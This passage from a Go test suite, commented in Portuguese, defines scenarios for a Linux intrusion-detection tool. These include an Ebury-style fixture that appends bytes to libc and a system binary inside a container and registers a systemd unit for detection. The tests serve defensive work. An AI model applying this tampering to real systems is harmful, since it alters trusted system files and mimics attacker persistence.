		Desc: "servidor legado sem cgroup v2: a hierarquia nomeada é a que responde",
		// Kernel 3.18 não TEM cgroup v2. O coletor prefere v2, cai para
		// `name=systemd` e só então para qualquer controlador — e essa ordem
		// existe porque é a hierarquia nomeada que carrega a unit. Sem este
		// cenário a preferência ficava sem prova.
		Mode:   VM,
		Kernel: "3.18",
		Setup: `mkdir -p /tmp/cg
			mount -t cgroup -o none,name=systemd cgroup /tmp/cg
			mkdir -p /tmp/cg/legado.service
			/helper caps 1000 &
			echo $! > /tmp/cg/legado.service/cgroup.procs
			sleep 0.5`,
		Expect: []Expect{{
			ID: "proc.caps_unexpected", Sev: "WARN",
			Evidence: "cgroup=/legado.service",
		}},
		Exit: 1,
	})

	Register(Scenario{
		ID:   "54-i686-limpo",
		Desc: "i686 de verdade — kernel, userland e binário de 32 bits — limpo",
		// Fecha o último canto de "servidor legado". O cenário 30 prova o
		// BINÁRIO de 32 bits contra um kernel de 64; aqui o kernel também é de
		// 32, e é ele que formata os campos de 64 bits do /proc sem ter
		// registrador de 64 bits para isso.
		Mode:           VM,
		Arch:           "386",
		Kernel:         "4.14",
		Exit:           0,
		MustBeComplete: true,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:     "55-i686-implante",
		Desc:   "i686 enxerga exatamente os mesmos implantes que amd64",
		Mode:   VM,
		Arch:   "386",
		Kernel: "3.18",
		Setup:  implantes,
		Expect: []Expect{
			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
			{ID: "proc.memfd_exec", Sev: "CRITICAL"},
			{ID: "proc.maps_rwx_anon", Sev: "WARN"},
			{ID: "proc.tracer", Sev: "WARN"},
			{ID: "proc.caps_unexpected", Sev: "WARN"},
			{ID: "proc.suspicious_path", Sev: "WARN"},
		},
		Exit:           2,
		MustBeComplete: true,
	})

	// O cenário 91 (ocultacao-por-rootkit) foi REMOVIDO: ele declarava as cinco
	// comparações cruzadas impossíveis de plantar ("carregar um LKM de ocultação
	// trocaria a garantia de um check pela perda de controle do ambiente"). O tier
	// de VM desfez essa recusa — cada cross.* agora é MEDIDO contra kernel real em
	// cases_ocultacao.go (RK-cross-socket-view, RK-cross-module-view, RK-hidden-pid,
	// RK-thread-count, RK-bpf-hidden). O efeito sobre a CONFIANÇA (um cross.*
	// CRITICAL invalida as ausências) que o 91 documentava agora é asserção viva:
	// os quatro CRITICAL exigem MustBeIncomplete + "O KERNEL SE CONTRADISSE".

	Register(Scenario{
		ID:   "92-userland-trojanizado",
		Desc: "binário e biblioteca do sistema SUBSTITUÍDOS no lugar: a forma do Ebury",
		// ESTE CENÁRIO ESTEVE DECLARADO IMPOSSÍVEL, e a declaração dizia por
		// quê: "vale construir quando a fase 7 (integridade) existir". Ela
		// existe, e ele foi construído.
		//
		// É a forma do Ebury, que operou anos em servidores de hospedagem: a
		// biblioteca fica NO LUGAR DELA. Caminho legítimo, nome certo, dono de
		// pacote em ordem — e conteúdo trocado. Toda pergunta de propriedade
		// responde "sim, veio de um pacote", e todas estão certas e cegas ao
		// mesmo tempo.
		//
		// O que ele exercita são as duas metades da decisão da SPEC 4:
		//
		//	o binário do host mente, e a CLI não pergunta a ele — ela é
		//	estática e lê /proc direto, então `ls` e `ps` trocados não mudam
		//	uma linha do resultado
		//
		//	e agora ela DENUNCIA a troca, comparando com o hash que o próprio
		//	gerenciador de pacotes guarda
		Images: []string{"debian:12", "alpine:3.20"},
		Plant:  userlandTrojanizado,
		Expect: []Expect{
			// O binário de sistema alterado. O caminho difere por distribuição —
			// o que o cenário cobra é que a alteração apareça, não onde.
			{ID: "integrity.pkg_file_modified", Sev: "CRITICAL", Evidence: "não confere com o que o pacote"},
			// E a biblioteca, que é o caso mais grave: o carregador põe o código
			// do invasor dentro de todo processo que linkar contra ela, sem
			// nenhum processo novo aparecer.
			{ID: "integrity.pkg_file_modified", Evidence: "é uma BIBLIOTECA"},
			// E a evidência que explica por que isto é pior que um binário
			// trocado: não aparece processo novo nenhum.
			{ID: "integrity.pkg_file_modified", Evidence: "sem nenhum"},
		},
		// E a resposta precisa continuar completa: userland adulterado não
		// degrada a cobertura, porque a CLI nunca dependeu dele.
		Exit:           2,
		MustBeComplete: true,
	})
}

// userlandTrojanizado altera um binário e uma biblioteca NO LUGAR deles.
const userlandTrojanizado = `
# um processo vivo, para que a biblioteca dele apareça no mapa de memória: é a
# ÚNICA fonte que torna uma biblioteca candidata, porque ela não executa
sleep 120 &
sleep 0.2

# a biblioteca alterada no lugar dela, que é a forma do Ebury.
#
# Acrescentar um byte ao FIM de um ELF muda o hash e não quebra o carregamento
# — o carregador lê os cabeçalhos de programa e ignora o resto. É por isso que
# dá para fazer isto com a libc de um contêiner descartável sem derrubá-lo, e é
# também uma técnica real de anexar carga a uma biblioteca.
for lib in /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/x86_64-linux-gnu/libc.so.6 \
           /lib/ld-musl-x86_64.so.1; do
  [ -f "$lib" ] || continue
  printf '\0' >> "$lib"
  break
done

# e um binário de sistema, alterado no lugar dele.
#
# Precisa ser um que o gerenciador REALMENTE reivindique: na Alpine o
# /usr/bin/wc é um symlink que o busybox cria no pós-install, e o apk não o
# lista — a ferramenta o trata como sem dono, e está certa.
mkdir -p /etc/systemd/system
for bin in /usr/bin/wc /bin/busybox; do
  [ -f "$bin" ] && [ ! -L "$bin" ] || continue
  printf '\0' >> "$bin"
  # alguma coisa precisa fazer a CLI PERGUNTAR por ele: só é candidato o que
  # executa, agenda ou é alvo de gatilho
  printf '[Unit]\nDescription=Log Count\n[Service]\nExecStart=%s -l /var/log/syslog\n[Install]\nWantedBy=multi-user.target\n' "$bin" > /etc/systemd/system/logcount.service
  break
done
`
